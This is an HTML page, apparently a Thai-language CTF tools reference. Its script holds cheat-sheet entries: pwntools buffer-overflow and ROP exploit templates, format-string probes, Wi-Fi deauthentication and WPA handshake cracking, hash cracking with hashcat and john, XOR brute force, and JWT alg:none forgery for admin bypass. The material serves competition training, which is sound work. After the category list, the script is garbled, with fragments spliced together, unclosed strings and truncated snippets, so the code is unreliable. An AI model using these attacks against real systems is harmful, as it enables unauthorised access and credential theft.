<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>⚑ CTF Tools WEB2 — 2025 Competition Reference</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%23070710'/%3E%3Cpath d='M18 12v40M20 14h28l-6 9 6 9H20' fill='none' stroke='%235b8dee' stroke-width='5' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='18' cy='52' r='4' fill='%239b6dff'/%3E%3C/svg%3E">
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
:root{
  --bg:#070710;--bg2:#0e0e1a;--bg3:#14142a;--bg4:#1a1a35;
  --border:rgba(255,255,255,.07);--border2:rgba(255,255,255,.12);
  --text:#e2e4f0;--muted:#6b7099;--muted2:#4a4f70;
  --blue:#5b8dee;--purple:#9b6dff;--cyan:#3ecfcf;--green:#3ecf74;
  --yellow:#f5c842;--orange:#ff8c42;--red:#ff5c7a;--pink:#e55fcc;
}
*{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;font-size:13.5px;line-height:1.6;min-height:100vh;overflow-x:hidden}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--bg4);border-radius:99px}

/* layout */
#wrap{display:flex;height:100vh;overflow:hidden}

/* sidebar */
#sidebar{width:220px;min-width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto}
.sb-logo{padding:18px 16px 12px;border-bottom:1px solid var(--border)}
.sb-logo h1{font-size:14px;font-weight:700;background:linear-gradient(135deg,var(--blue),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sb-logo p{font-size:10px;color:var(--muted);margin-top:1px}
.sb-search{padding:10px 10px 6px}
.sb-search input{width:100%;padding:7px 11px;background:var(--bg3);border:1px solid var(--border2);border-radius:8px;color:var(--text);font-size:12px;outline:none;font-family:inherit}
.sb-search input:focus{border-color:var(--blue)}
.sb-search input::placeholder{color:var(--muted2)}
.sb-nav{padding:4px 8px;flex:1}
.sb-label{padding:8px 8px 3px;font-size:9.5px;font-weight:600;color:var(--muted2);text-transform:uppercase;letter-spacing:.8px}
.sb-item{display:flex;align-items:center;gap:8px;padding:6px 9px;border-radius:7px;cursor:pointer;transition:all .12s;font-size:12px;color:var(--muted);border:none;background:none;width:100%;text-align:left;position:relative;font-family:inherit}
.sb-item:hover{background:var(--bg3);color:var(--text)}
.sb-item.active{background:var(--bg4);color:var(--text)}
.sb-item.active::before{content:'';position:absolute;left:0;top:25%;bottom:25%;width:3px;border-radius:0 3px 3px 0;background:var(--c,var(--blue))}
.sb-dot{width:20px;height:20px;border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;background:color-mix(in srgb,var(--c,var(--blue)) 15%,transparent)}
.sb-count{margin-left:auto;font-size:9px;color:var(--muted2);background:var(--bg3);padding:1px 5px;border-radius:99px}
.sb-footer{padding:10px 14px;border-top:1px solid var(--border);font-size:10px;color:var(--muted2);line-height:1.7}

/* main */
#main{flex:1;overflow-y:auto;overflow-x:hidden;display:flex;flex-direction:column}
#topbar{padding:16px 28px 12px;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:50;background:rgba(7,7,16,.85);backdrop-filter:blur(14px)}
#pt{font-size:19px;font-weight:700;background:linear-gradient(90deg,var(--blue),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#pt-count{font-size:11px;color:var(--muted);margin-top:1px}
#content{padding:20px 28px 60px;flex:1}

/* section */
.sec{margin-bottom:40px}
.sec-head{display:flex;align-items:center;gap:9px;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--border)}
.sec-icon{width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;background:color-mix(in srgb,var(--c,var(--blue)) 15%,transparent)}
.sec-title{font-size:14px;font-weight:700}
.sec-badge{margin-left:auto;padding:1px 8px;border-radius:99px;font-size:9.5px;font-weight:600;background:color-mix(in srgb,var(--c,var(--blue)) 13%,transparent);color:var(--c,var(--blue))}

/* tool grid */
.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:9px}

/* card */
.card{background:var(--bg2);border:1px solid var(--border);border-radius:11px;overflow:hidden;transition:border-color .2s}
.card:hover{border-color:color-mix(in srgb,var(--c,var(--blue)) 40%,transparent)}
.card-header{padding:12px 14px;cursor:pointer;display:flex;flex-direction:column;gap:6px;user-select:none}
.card-top{display:flex;align-items:flex-start;justify-content:space-between;gap:6px}
.card-name{font-size:13px;font-weight:600;color:var(--c,var(--blue));display:flex;align-items:center;gap:5px}
.card-name .dot{width:5px;height:5px;border-radius:50%;background:var(--c,var(--blue));flex-shrink:0}
.card-link{font-size:10px;color:var(--cyan);background:rgba(62,207,207,.08);padding:3px 8px;border-radius:5px;flex-shrink:0;transition:all .15s;border:1px solid rgba(62,207,207,.18);text-decoration:none}
.card-link:hover,.card-link:focus-visible{border-color:var(--cyan);color:#b8ffff;outline:none}
.card-expand{font-size:10px;color:var(--muted2);background:var(--bg3);padding:3px 8px;border-radius:5px;flex-shrink:0;transition:all .15s;cursor:pointer;border:1px solid var(--border)}
.card-expand:hover{border-color:var(--border2);color:var(--text)}
.card-desc{font-size:12px;color:var(--text);opacity:.8;line-height:1.5}
.card-tags{display:flex;flex-wrap:wrap;gap:3px}
.tag{font-size:9.5px;font-weight:500;padding:1px 7px;border-radius:99px}
.tag-online{background:rgba(62,207,116,.1);color:#3ecf74}
.tag-cli{background:rgba(255,92,122,.1);color:#ff5c7a}
.tag-python{background:rgba(155,109,255,.1);color:#9b6dff}
.tag-java{background:rgba(245,200,66,.1);color:#f5c842}
.tag-ruby{background:rgba(229,95,204,.1);color:#e55fcc}

/* expandable body */
.card-body{display:none;border-top:1px solid var(--border)}
.card-body.open{display:block}

/* tabs */
.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);padding:0 14px;background:var(--bg3)}
.tab{padding:7px 12px;font-size:11px;color:var(--muted);cursor:pointer;border:0;border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap;background:none;font-family:inherit}
.tab:hover{color:var(--text)}
.tab.active{color:var(--c,var(--blue));border-bottom-color:var(--c,var(--blue))}
.tab-content{display:none;padding:12px 14px}
.tab-content.active{display:block}

/* code block */
.codeblock{background:var(--bg);border:1px solid var(--border);border-radius:7px;overflow:hidden;margin:6px 0}
.code-label{font-size:9px;font-weight:600;color:var(--muted2);text-transform:uppercase;letter-spacing:.6px;padding:4px 10px;background:var(--bg3);border-bottom:1px solid var(--border)}
.codeblock pre{font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.65;color:#b0b8e0;padding:10px 12px;overflow-x:auto;margin:0;white-space:pre}
.codeblock .copy-btn{float:right;margin:-26px 6px 0 0;font-size:9.5px;padding:2px 7px;border-radius:4px;cursor:pointer;background:var(--bg4);border:1px solid var(--border2);color:var(--muted);transition:.12s;position:relative;z-index:1}
.codeblock .copy-btn:hover{color:var(--text)}

/* inline docs */
.doc-section{margin-bottom:14px}
.doc-section h4{font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px;display:flex;align-items:center;gap:5px}
.doc-section h4::after{content:'';flex:1;height:1px;background:var(--border)}
.doc-p{font-size:12px;color:var(--text);opacity:.85;line-height:1.6;margin-bottom:6px;white-space:pre-wrap}
.tip-box{background:rgba(91,141,238,.07);border-left:3px solid var(--blue);border-radius:0 6px 6px 0;padding:7px 10px;font-size:11.5px;color:#8ba8e8;margin:6px 0}
.warn-box{background:rgba(255,140,66,.07);border-left:3px solid var(--orange);border-radius:0 6px 6px 0;padding:7px 10px;font-size:11.5px;color:#e8a878;margin:6px 0}
.checklist{list-style:none;padding:0}
.checklist li{font-size:11.5px;padding:3px 0;color:var(--text);opacity:.85;display:flex;align-items:flex-start;gap:6px}
.checklist li::before{content:'›';color:var(--c,var(--blue));font-weight:700;flex-shrink:0;font-size:13px;line-height:1.3}
.install-cmd{font-family:'JetBrains Mono',monospace;font-size:11px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;padding:3px 8px;color:var(--cyan)}

/* search results */
#search-results{display:none}
.sr-cat-badge{display:inline-block;font-size:9px;padding:1px 7px;border-radius:99px;margin-bottom:5px;background:var(--bg4);color:var(--muted)}
mark{background:rgba(245,200,66,.22);color:#f0d060;border-radius:2px;padding:0 1px}

/* editor */
.editor-actions{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
.editor-btn,.editor-file{border:1px solid var(--border2);background:var(--bg3);color:var(--text);border-radius:7px;padding:6px 10px;font:inherit;font-size:11.5px;cursor:pointer;transition:.14s;text-decoration:none}
.editor-btn:hover,.editor-file:hover{border-color:var(--blue);color:#fff}
.editor-btn.primary{background:rgba(91,141,238,.16);border-color:rgba(91,141,238,.4);color:#cfe0ff}
.editor-btn.danger{background:rgba(255,92,122,.12);border-color:rgba(255,92,122,.35);color:#ff9bac}
.editor-file input{display:none}
.editor-card-actions{display:flex;gap:5px;align-items:center;flex-wrap:wrap}
.editor-mini-btn{font-size:10px;color:var(--muted);background:var(--bg3);padding:3px 7px;border-radius:5px;flex-shrink:0;transition:all .15s;cursor:pointer;border:1px solid var(--border);font-family:inherit}
.editor-mini-btn:hover{border-color:var(--border2);color:var(--text)}
.editor-mini-btn.danger:hover{border-color:var(--red);color:#ffc7d0}
.editor-modal{position:fixed;inset:0;background:rgba(0,0,0,.68);display:none;align-items:center;justify-content:center;padding:18px;z-index:200}
.editor-modal.open{display:flex}
.editor-dialog{width:min(980px,100%);max-height:92vh;overflow:auto;background:var(--bg2);border:1px solid var(--border2);border-radius:10px;box-shadow:0 18px 60px rgba(0,0,0,.45)}
.editor-head{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:14px 16px;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg2);z-index:1}
.editor-head h2{font-size:15px;margin:0;color:var(--text)}
.editor-close{width:30px;height:30px;border-radius:7px;border:1px solid var(--border);background:var(--bg3);color:var(--muted);cursor:pointer;font-size:18px;line-height:1}
.editor-close:hover{color:#fff;border-color:var(--border2)}
.editor-body{padding:14px 16px 16px}
.editor-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px}
.editor-field{display:flex;flex-direction:column;gap:5px}
.editor-field.full{grid-column:1/-1}
.editor-field label{font-size:10px;text-transform:uppercase;letter-spacing:.6px;color:var(--muted)}
.editor-field input,.editor-field select,.editor-field textarea{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:7px;color:var(--text);font:inherit;font-size:12px;padding:8px 10px;outline:none}
.editor-field textarea{min-height:92px;resize:vertical;font-family:'JetBrains Mono',monospace;line-height:1.55}
.editor-field input:focus,.editor-field select:focus,.editor-field textarea:focus{border-color:var(--blue)}
.editor-help{font-size:10.5px;color:var(--muted2);line-height:1.5;margin-top:2px}
.editor-foot{display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-top:14px;padding-top:12px;border-top:1px solid var(--border)}
.editor-foot-left,.editor-foot-right{display:flex;gap:8px;flex-wrap:wrap}

/* empty */
#empty{display:none;padding:60px;text-align:center;color:var(--muted)}
#empty .ei{font-size:36px;margin-bottom:10px}

/* back to top */
#btt{position:fixed;bottom:20px;right:20px;width:36px;height:36px;border-radius:50%;background:var(--blue);color:#000;border:none;font-size:16px;cursor:pointer;opacity:0;transform:translateY(6px);transition:all .22s;display:flex;align-items:center;justify-content:center;box-shadow:0 3px 12px rgba(91,141,238,.4);z-index:99}
#btt.show{opacity:1;transform:translateY(0)}

/* mobile controls */
.mobile-actions{display:none;gap:8px;margin-top:10px}
.mobile-actions input,.mobile-actions select{background:var(--bg3);border:1px solid var(--border2);border-radius:8px;color:var(--text);font:inherit;font-size:12px;outline:none}
.mobile-actions input{min-width:0;flex:1;padding:8px 10px}
.mobile-actions select{width:150px;padding:8px 9px;color:var(--muted)}
.mobile-actions input:focus,.mobile-actions select:focus{border-color:var(--blue)}

@media(max-width:700px){
  #sidebar{display:none}
  #topbar{padding:13px 14px 11px}
  #content{padding:14px}
  .mobile-actions{display:flex}
  .tool-grid{grid-template-columns:1fr}
  .card-top{gap:8px}
  .card-name{min-width:0}
  .tabs{overflow-x:auto;padding:0 10px}
  .codeblock pre{font-size:10.5px}
  .editor-grid{grid-template-columns:1fr}
  .editor-actions{gap:5px}
  .editor-btn,.editor-file{font-size:11px;padding:6px 8px}
}
</style>
</head>
<body>
<div id="wrap">

<nav id="sidebar">
  <div class="sb-logo">
    <h1>⚑ CTF Tools WEB2</h1>
    <p>2025 Competition Reference</p>
  </div>
  <div class="sb-search"><input id="sb-search" class="search-input" placeholder="🔍  ค้นหา..." autocomplete="off" aria-label="ค้นหาเครื่องมือ"></div>
  <div class="sb-nav" id="sb-nav"></div>
  <div class="sb-footer">
    gregalletti/CTF_tools + WEB2 2025 pack<br>
    Self-contained — เพิ่มชุดเครื่องมือแข่งปี 2025
  </div>
</nav>

<div id="main">
  <div id="topbar">
    <div id="pt">ทั้งหมด</div>
    <div id="pt-count"></div>
    <div class="editor-actions" aria-label="Tool editor">
      <button type="button" class="editor-btn primary" onclick="openToolEditor()">+ เพิ่ม Tool/Blog</button>
      <button type="button" class="editor-btn" onclick="exportEditorData()">Export edits</button>
      <label class="editor-file">Import edits<input type="file" accept="application/json,.json" onchange="importEditorData(this)"></label>
      <button type="button" class="editor-btn danger" onclick="resetEditorData()">Reset edits</button>
    </div>
    <div class="mobile-actions" aria-label="Mobile filters">
      <input id="mobile-search" class="search-input" placeholder="🔍 ค้นหา..." autocomplete="off" aria-label="ค้นหาเครื่องมือบนมือถือ">
      <select id="mobile-cat" aria-label="เลือกหมวดหมู่"></select>
    </div>
  </div>
  <div id="content">
    <div id="sections-wrap"></div>
    <div id="search-results"></div>
    <div id="empty"><div class="ei">🔎</div><p>ไม่พบเครื่องมือที่ตรงกัน</p></div>
  </div>
</div>
</div>
<button id="btt" onclick="document.getElementById('main').scrollTo({top:0,behavior:'smooth'})">↑</button>

<div id="editor-modal" class="editor-modal" aria-hidden="true">
  <div class="editor-dialog" role="dialog" aria-modal="true" aria-labelledby="editor-title">
    <div class="editor-head">
      <h2 id="editor-title">เพิ่ม Tool / Blog</h2>
      <button type="button" class="editor-close" onclick="closeToolEditor()" aria-label="Close editor">×</button>
    </div>
    <form id="tool-editor-form" class="editor-body" onsubmit="saveToolEditor(event)">
      <input type="hidden" id="editor-id">
      <div class="editor-grid">
        <div class="editor-field">
          <label for="editor-name">ชื่อ Tool / Blog</label>
          <input id="editor-name" required placeholder="เช่น Volatility 3 quick notes">
        </div>
        <div class="editor-field">
          <label for="editor-cat">หมวดหมู่</label>
          <select id="editor-cat" required></select>
        </div>
        <div class="editor-field">
          <label for="editor-url">URL</label>
          <input id="editor-url" placeholder="https://...">
        </div>
        <div class="editor-field">
          <label for="editor-tags">Tags</label>
          <input id="editor-tags" placeholder="cli, python, online">
        </div>
        <div class="editor-field full">
          <label for="editor-desc">คำอธิบายสั้น</label>
          <textarea id="editor-desc" required placeholder="สรุปสั้น ๆ ที่เห็นบนการ์ด"></textarea>
        </div>
        <div class="editor-field full">
          <label for="editor-about">ภาพรวม / เนื้อหา</label>
          <textarea id="editor-about" placeholder="แก้/เพิ่มรายละเอียดหลักของ tool นี้"></textarea>
        </div>
        <div class="editor-field full">
          <label for="editor-blog">Blog / Notes</label>
          <textarea id="editor-blog" placeholder="เขียน blog, guideline, writeup, ขั้นตอนคิด หรือ note เพิ่มเติมของ tool นี้"></textarea>
        </div>
        <div class="editor-field full">
          <label for="editor-install">ติดตั้ง</label>
          <textarea id="editor-install" placeholder="คำสั่งติดตั้ง หรือ setup notes"></textarea>
        </div>
        <div class="editor-field full">
          <label for="editor-usage">วิธีใช้ / Commands</label>
          <textarea id="editor-usage" placeholder="### Basic&#10;command here&#10;&#10;===&#10;&#10;### Advanced&#10;command here"></textarea>
          <div class="editor-help">ใช้รูปแบบ ### ชื่อหัวข้อ แล้วตามด้วยคำสั่ง คั่นหลายบล็อกด้วย ===</div>
        </div>
        <div class="editor-field full">
          <label for="editor-tips">Tips</label>
          <textarea id="editor-tips" placeholder="หนึ่งบรรทัดต่อหนึ่ง tip"></textarea>
        </div>
        <div class="editor-field full">
          <label for="editor-checklist">Checklist</label>
          <textarea id="editor-checklist" placeholder="หนึ่งบรรทัดต่อหนึ่ง checklist"></textarea>
        </div>
      </div>
      <div class="editor-foot">
        <div class="editor-foot-left">
          <button type="button" id="editor-delete" class="editor-btn danger" onclick="deleteToolFromModal()">ลบ Tool นี้</button>
          <button type="button" id="editor-restore" class="editor-btn" onclick="restoreOriginalTool()">คืนค่าเดิมของ Tool นี้</button>
        </div>
        <div class="editor-foot-right">
          <button type="button" class="editor-btn" onclick="closeToolEditor()">ยกเลิก</button>
          <button type="submit" class="editor-btn primary">บันทึก</button>
        </div>
      </div>
    </form>
  </div>
</div>

<script>
// ════════════════════════════════════════════════════════════
// CATEGORIES
// ════════════════════════════════════════════════════════════
const CATS=[
  {id:'all',      icon:'🏠',label:'ทั้งหมด',     c:'#5b8dee'},
  {id:'knowledge',icon:'KB',label:'Knowledge',   c:'#3ecf74'},
  {id:'ctf2025',  icon:'25',label:'Tools 2025',  c:'#f5c842'},
  {id:'training', icon:'🚩',label:'Training',     c:'#3ecf74'},
  {id:'general',  icon:'📋',label:'General',      c:'#5b8dee'},
  {id:'crypto',   icon:'🔒',label:'Cryptography', c:'#9b6dff'},
  {id:'stego',    icon:'🎨',label:'Steganography',c:'#e55fcc'},
  {id:'web',      icon:'🕸️',label:'Web',          c:'#3ecfcf'},
  {id:'pwn',      icon:'🐛',label:'Pwn / Binary', c:'#ff5c7a'},
  {id:'forensics',icon:'🕵️',label:'Forensics',    c:'#f5c842'},
  {id:'osint',    icon:'🌐',label:'OSINT',         c:'#ff8c42'},
  {id:'reversing',icon:'↩️',label:'Reversing',    c:'#3ecf74'},
  {id:'network',  icon:'📡',label:'Network',       c:'#5b8dee'},
  {id:'ot',       icon:'🏭',label:'OT Security',   c:'#ff8c42'},
  {id:'cloud',    icon:'☁️',label:'Cloud Security',c:'#3ecfcf'},
  {id:'mobileforensic',icon:'📱',label:'Mobile Forensic',c:'#e55fcc'},
  {id:'misc',     icon:'🔧',label:'Misc / Tips',  c:'#9b6dff'},
  {id:'ad',        icon:'🏢',label:'Active Directory',c:'#ff8c42'},
];

// ════════════════════════════════════════════════════════════

{label:'Find offset + ret2win skeleton',body:`# create cyclic pattern
python3 - <<'PY'

print(cyclic(300).decode())
PY

# after crash, find offset from RIP/EIP value
python3 - <<'PY'

print(cyclic_find(0x6161616c))
PY

# pwntools ret2win
python3 - <<'PY'
from pwn import *
elf = context.binary = ELF('./chall')
p = process()
offset = 72
payload = flat(
    b'A' * offset,
    elf.symbols['win']
)
p.sendlineafter(b'> ', payload)
p.interactive()

{label:'Remote exploit template',body:`from pwn import *
context.binary = elf = ELF('./chall')
context.log_level = 'info'

HOST, PORT = 'host', 31337
def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

p = start()
offset = 72
rop = ROP(elf)
payload = flat({offset: [
    rop.find_gadget(['ret'])[0],
    elf.symbols.get('win', 0x401234)
]})
p.sendline(payload)
p.interactive()

# run:
# python3 solve.py
# python3 solve.py REMOTE`},
{label:'ret2libc / ROP checklist',body:`# Need leak if PIE/ASLR/libc
checksec --file=chall
readelf -r chall | grep puts
ROPgadget --binary chall | grep "pop rdi"
ropper --file chall --search "pop rdi; ret"

# typical chain:
# 1. call puts(puts@got)
# 2. return main
# 3. compute libc base
# 4. call system("/bin/sh")

# one_gadget if libc known
one_gadget libc.so.6

# patch local libc/ld
pwninit
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall`},
{label:'Format string quick path',body:`# probes
AAAA.%p.%p.%p.%p.%p.%p
%x-%x-%x-%x
%s

# find offset manually:

    p.sendline(f'AAAA.%{i}$p'.encode())
    print(i, p.recvall(timeout=.2))

{cat:'ctf2025',name:'CTF 2025 Network Security Toolkit',url:'https://www.wireshark.org/',tags:['cli'],
desc:'Wireshark, tshark, Brim, NetworkMiner, tcpdump, Aircrack-ng, Acrylic Wi-Fi Analyzer',
about:'Network Security ปี 2025 เน้น packet analysis, file extraction, credentials, wireless capture และ timeline: Wireshark, Tshark, Brim/Zeek, NetworkMiner, Tcpdump, Aircrack-ng และ Acrylic Wi-Fi Analyzer',
install:`sudo apt update
sudo apt install -y wireshark tshark tcpdump aircrack-ng zeek network-manager

# Brim is now often distributed as a Zeek/Zui workflow depending on version.
# NetworkMiner and Acrylic Wi-Fi Analyzer are common Windows GUI tools.`,
usage:[{label:'PCAP first pass',body:`PCAP=capture.pcapng
file $PCAP
capinfos $PCAP
tshark -r $PCAP -q -z io,phs
tshark -r $PCAP -q -z conv,tcp
tshark -r $PCAP -q -z conv,udp
tshark -r $PCAP -T fields -e frame.number -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info | head

# quick flag search
tshark -r $PCAP -Y 'frame contains "flag" or frame contains "pico" or frame contains "ctf"'
strings -a $PCAP | grep -aiE "flag|pico|ctf|password|secret"`},
{label:'Wireshark filters',body:`http
http.request
http.request.method == "POST"
http contains "flag"
tcp.stream eq 0
dns
ftp || ftp-data
smtp || pop || imap
tls
ip.addr == 10.0.0.5
tcp.port == 80
frame contains "password"
urlencoded-form`},
{label:'Tshark extraction',body:`# HTTP objects
mkdir -p http_objects
tshark -r $PCAP --export-objects http,http_objects

# Follow streams
tshark -r $PCAP -q -z follow,tcp,ascii,0
tshark -r $PCAP -q -z follow,udp,ascii,0

# URLs / hosts / DNS
tshark -r $PCAP -Y http.request -T fields -e http.host -e http.request.uri
tshark -r $PCAP -Y dns.qry.name -T fields -e dns.qry.name | sort -u

# credentials-ish
tshark -r $PCAP -Y 'http.request.method == "POST"' -T fields -e frame.number -e http.file_data
tshark -r $PCAP -Y ftp.request.command -T fields -e ftp.request.command -e ftp.request.arg`},
{label:'Tcpdump capture/filters',body:`# live capture
sudo tcpdump -i any -nn -w capture.pcap
sudo tcpdump -i eth0 host 10.10.10.10 -w host.pcap
sudo tcpdump -i eth0 port 80 -A
sudo tcpdump -r capture.pcap -nn
sudo tcpdump -r capture.pcap -A 'tcp port 80'

# split large pcap
editcap -c 10000 big.pcap split.pcap
editcap -A "2025-01-01 00:00:00" -B "2025-01-01 01:00:00" big.pcap slice.pcap`},
{label:'Brim/Zeek + NetworkMiner',body:`# Zeek logs
zeek -r capture.pcap
ls *.log
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service duration
cat http.log | zeek-cut host uri user_agent
cat dns.log | zeek-cut query answers
cat files.log | zeek-cut fuid mime_type filename extracted

# Brim/Zui
# import pcap -> inspect connections, DNS, HTTP, files timeline

# NetworkMiner
# open pcap -> Hosts, Files, Images, Credentials tabs
# export files/images and grep for flag`},
{label:'Wireless / Aircrack-ng',body:`# monitor mode
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# deauth for handshake when allowed
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# crack WPA handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Acrylic Wi-Fi Analyzer: Windows GUI for channel/AP/client inspection`}],

{label:'Algorithm snippets from PDF topics',body:`# prime
def is_prime(n):
    if n < 2: return False
    i = 2
    while i * i <= n:
        if n % i == 0: return False
        i += 1
    return True

# palindrome
def is_palindrome(s):
    return s == s[::-1]

# Fibonacci
def fibo(n):
    a,b = 0,1
    for _ in range(n):
        a,b = b,a+b
    return a

# matrix multiply
def matmul(A,B):
    return [[sum(A[i][k]*B[k][j] for k in range(len(B)))
             for j in range(len(B[0]))] for i in range(len(A))]`},

usage:[{label:'Single-key XOR + bruteforce',body:`ct = bytes.fromhex('1b3b1b')

{label:'Known-plaintext → หา key',body:`# ถ้ารู้ว่า plaintext ขึ้นต้นด้วย 'flag{'

{label:'🚩 CTF scenario — XOR cipher',body:`# โจทย์: ได้ ciphertext hex มา พร้อม hint ว่าใช้ single-byte XOR
ct = bytes.fromhex('3b1f3a1e2c1f3a1b2a1b')

# brute force ทุก key 0–255
for k in range(256):
    pt = bytes([b ^ k for b in ct])
    if pt.startswith(b'flag') or pt.startswith(b'CTF'):
        print(f'key={k}', pt)
    # หรือ check ว่าเป็น printable ASCII
    if all(32 <= b < 127 for b in pt):
        print(f'key={k}:', pt.decode())

# โจทย์ repeating-key XOR:
# hint: key สั้น 3–5 chars
from itertools import cycle
ct = bytes.fromhex('deadbeefdeadbeef...')
# ลอง key candidates
for key in [b'key', b'xor', b'flag', b'secret']:
    pt = bytes([a^b for a,b in zip(ct, cycle(key))])
    if all(32 <= x < 127 for x in pt):
        print(key, pt.decode())`}],

desc:'Hash type identifier — ระบุ hash algorithm พร้อม hashcat mode + john format ทันที',
about:'haiti ระบุ hash type จาก pattern ของ hash string ได้ละเอียดและแม่นยำกว่า hash-identifier ทั่วไป จุดเด่นคือบอก hashcat -m mode number และ john --format ให้ตรงทันที ทำให้ไม่ต้องเดาหรือหาเอง ครอบคลุม hash formats กว่า 500+ รูปแบบ',

usage:[{label:'Identify hash พื้นฐาน',body:`# identify hash เดียว:
haiti 5d41402abc4b2a76b9719d911017c592
# output:
# MD5 (hashcat: 0, john: raw-md5)
# MD4 (hashcat: 900, john: raw-md4)
# RIPEMD-128 (hashcat: 6100, john: -)
# ...

# bcrypt:
haiti '$2b$12$WXBjHqhQ3TLp0q4lM4JKfO8OjJhGFO5H1tQy4.k9H0E3'
# → bcrypt (hashcat: 3200, john: bcrypt)

# SHA-256:
haiti e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
# → SHA-256 (hashcat: 1400, john: raw-sha256)`},
{label:'เฉพาะ hashcat mode หรือ john format',body:`# แสดงเฉพาะ hashcat mode (สำหรับ pipe):

# → 0

# แสดงเฉพาะ john format:
haiti --john-only 5d41402abc4b2a76b9719d911017c592
# → raw-md5

# ดู extended info:
haiti -e 5d41402abc4b2a76b9719d911017c592`},
{label:'ใช้ต่อกับ hashcat/john ทันที',body:`HASH="5d41402abc4b2a76b9719d911017c592"

# crack ด้วย hashcat:

# crack ด้วย john (ต้องใส่ format เอง):
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`},

SHA-1:      40 hex chars    → hashcat -m 100
SHA-256:    64 hex chars    → hashcat -m 1400
SHA-512:    128 hex chars   → hashcat -m 1700

NTLM:       32 hex (Windows)→ hashcat -m 1000
NetNTLMv2:  user::domain:.. → hashcat -m 5600
MD5crypt:   $1$ prefix      → hashcat -m 500
sha512crypt:$6$ prefix      → hashcat -m 1800`}],

usage:[{label:'Python — IoC method',body:`from collections import Counter
import math

def ioc(text):
    text = [c for c in text.upper() if c.isalpha()]
    n = len(text)
    counts = Counter(text)
    return sum(c*(c-1) for c in counts.values()) / (n*(n-1))

def vigenere_decrypt(ct, key):
    ct = [c for c in ct.upper() if c.isalpha()]
    key = key.upper()
    return ''.join(chr((ord(c)-65 - (ord(key[i%len(key)])-65)) % 26 + 65)
                   for i,c in enumerate(ct))`},

desc:'Decode, verify, generate JWT tokens — tamper payload/header',
about:'JWT (JSON Web Token) เจอบ่อยใน web authentication CTF การ tamper JWT สามารถ bypass authentication ได้ถ้า server ไม่ verify signature อย่างถูกต้อง',
usage:[{label:'Python JWT attacks',body:`import jwt, base64, json

token = "eyJ..."
# Decode โดยไม่ verify
data = jwt.decode(token, options={"verify_signature":False})
print(data)  # ดู payload

# None algorithm attack (ไม่ต้อง secret)
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')
forged = f"{header.decode()}.{payload.decode()}."
print(forged)`},
{label:'HS256 → brute-force secret',body:`# ถ้าเป็น HS256 ลอง crack secret:

{label:'🚩 CTF scenario — JWT auth bypass',body:`# โจทย์: เว็บใช้ JWT เพื่อ verify ว่า admin หรือไม่

# Step 1: decode JWT ที่มีอยู่
import jwt, base64, json
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc"
data = jwt.decode(token, options={"verify_signature": False})
print(data)  # {"user": "guest"}

# Step 2: ลอง alg:none attack
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode()).rstrip(b'=')
forged = f"{header.decode()}.{payload.decode()}."
print(forged)
# ส่ง token นี้ใน Authorization header → ถ้า server ยอมรับ = bypass!

# Step 3: ถ้า alg:none ไม่ได้ → crack HS256 secret
# copy token ไปที่ jwt_crack.txt
hashcat -m 16500 jwt_crack.txt /usr/share/wordlists/rockyou.txt
# → ได้ secret: "secret123"

# Step 4: forge token ด้วย secret ที่ crack ได้
forged = jwt.encode({"user":"admin","role":"admin"}, "secret123", algorithm="HS256")
print(forged)`}],

